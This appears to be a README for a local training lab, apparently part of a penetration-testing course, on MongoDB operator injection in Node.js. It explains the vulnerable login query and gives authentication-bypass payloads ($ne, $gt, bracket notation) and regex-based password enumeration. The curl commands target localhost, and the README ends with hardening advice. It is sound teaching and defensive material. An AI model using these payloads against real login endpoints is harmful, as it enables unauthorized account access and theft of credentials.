# NoSQL Injection & MongoDB Operator Injection Lab

## Overview

This lab environment demonstrates **NoSQL Query Operator Injection** in Node.js applications interacting with document databases such as MongoDB. In traditional SQL injection, attackers inject SQL syntax to alter relational queries; in NoSQL injection, attackers supply structured objects (such as MongoDB query operators `{"$ne": null}` or `{"$gt": ""}`) instead of primitive strings to alter query logic and achieve authentication bypass or data exfiltration.

- **Service Access**: `http://localhost:3001/`
- **Default Port**: `3001` (mapped to container port `3000`)
- **Container Name**: `cyberlab_02_nosql_lab`
- **Upstream Image**: `blabla1337/owasp-skf-lab:sqli_node`
- **Source of Truth / Upstream Reference**: [OWASP SKF Labs Repository](https://github.com/OWASP-SKF/skf-labs)

---

## Vulnerability Mechanics

### 1. MongoDB Query Operator Injection

In typical Express.js / Node.js web applications, login authentication queries are often implemented using document find operations:

```javascript
// Vulnerable query pattern
db.collection("users").findOne(
  {
    username: req.body.username,
    password: req.body.password,
  },
  (err, user) => {
    if (user) {
      req.session.user = user;
      res.redirect("/dashboard");
    } else {
      res.status(401).send("Invalid credentials");
    }
  },
);
```

When an application parses JSON or URL-encoded payloads using `express.json()` or `bodyParser.urlencoded({ extended: true })`, user input is deserialized directly into JavaScript objects. If the application does not validate that `username` and `password` are strings, an attacker can submit an object containing MongoDB operators:

- **`$ne` (Not Equal)**:

  ```json
  { "username": "admin", "password": { "$ne": null } }
  ```

  The query evaluates as: _Find user where `username == "admin"` AND `password != null`_. Since any valid administrator account has a non-null password, this condition evaluates to `true`, logging the attacker in as `admin` without requiring knowledge of the secret password.

- **`$gt` (Greater Than)**:

  ```json
  { "username": "admin", "password": { "$gt": "" } }
  ```

  The query matches any record where the password is lexicographically greater than an empty string, similarly returning `true`.

- **Bracket Notation in Form Data**:
  When form data is submitted with `application/x-www-form-urlencoded`, standard `qs` parsers parse bracket parameters as nested objects:
  ```text
  username[$ne]=null&password[$ne]=null
  ```
  This deserializes into `{ username: { "$ne": "null" }, password: { "$ne": "null" } }`.

### 2. Blind Data Exfiltration via Regex

When direct authentication bypass is prevented or when extracting tokens/passwords:

```json
{ "username": "admin", "password": { "$regex": "^a.*" } }
```

By testing each character position (`^a`, `^b`, `^c`...), an attacker can enumerate passwords, API keys, or reset tokens byte-by-byte.

---

## Exploitation Walkthrough & curl Verification

### 1. Verify Service Availability

Check that the lab web application is accessible and serving responses:

```bash
curl -i http://localhost:3001/
```

**Expected Response**:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
...
```

### 2. Test NoSQL Authentication Bypass via `$ne` Operator

Send a JSON payload with `$ne` operator targeting the authentication endpoint:

```bash
curl -i -X POST http://localhost:3001/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": null}}'
```

**Expected Response on Vulnerable NoSQL Authentication Targets**:

- `HTTP/1.1 200 OK` or `HTTP/1.1 302 Found` with `Set-Cookie` session identifier, JWT token, or redirect location `/dashboard`.

### 3. Test NoSQL Authentication Bypass via `$gt` Operator

Send a JSON payload using the `$gt` (greater than) operator:

```bash
curl -i -X POST http://localhost:3001/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```

**Expected Response**:

- Document match confirming administrative session authorization.

### 4. Test URL-Encoded Parameter Operator Injection

Send form-urlencoded data with bracket notation to test query parsers (`qs` / `body-parser`):

```bash
curl -i -X POST http://localhost:3001/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password[\$ne]=null"
```

---

## Defensive Remediation & Hardening

1. **Input Type Validation / Schema Enforcement**: Validate incoming request fields with schema libraries such as Joi, Zod, or `express-validator` to ensure fields are strictly strings and not objects:
   ```javascript
   if (typeof req.body.password !== "string") {
     return res.status(400).send("Invalid input type");
   }
   ```
2. **Sanitize Operator Keys**: Use `mongo-sanitize` middleware to strip all keys containing `$` or `.`:
   ```javascript
   const mongoSanitize = require("express-mongo-sanitize");
   app.use(mongoSanitize());
   ```
3. **Mongoose Schema Casting**: Define strict Mongoose models; Mongoose automatically casts non-object schema fields to their declared types, rejecting unauthorized operator objects.

---

## YouTube Walkthroughs & Solving Guides

- [NoSQL Injection Basic Tutorial & Walkthrough](https://www.youtube.com/watch?v=4TJlREKMZMk)
- [TCM Security - NoSQLi Tutorial & Labs](https://www.youtube.com/watch?v=5SmDLBQxmXw)
- [Exploiting NoSQL Operator Injection to Bypass Authentication](https://www.youtube.com/watch?v=DBNmAJaWcGk)

---

## References & Source of Truth

- [OWASP SKF Labs Repository](https://github.com/OWASP-SKF/skf-labs)
- [OWASP Security Knowledge Framework (SKF)](https://owasp-skf.gitbook.io/)
- [OWASP NoSQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy: NoSQL Injection](https://portswigger.net/web-security/nosql-injection)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Start this lab
docker compose -f Classes/02_web_penetration_tester/22_nosql_injection/nosql_injection_lab/docker-compose.yml up -d

# Stop this lab
docker compose -f Classes/02_web_penetration_tester/22_nosql_injection/nosql_injection_lab/docker-compose.yml down
```
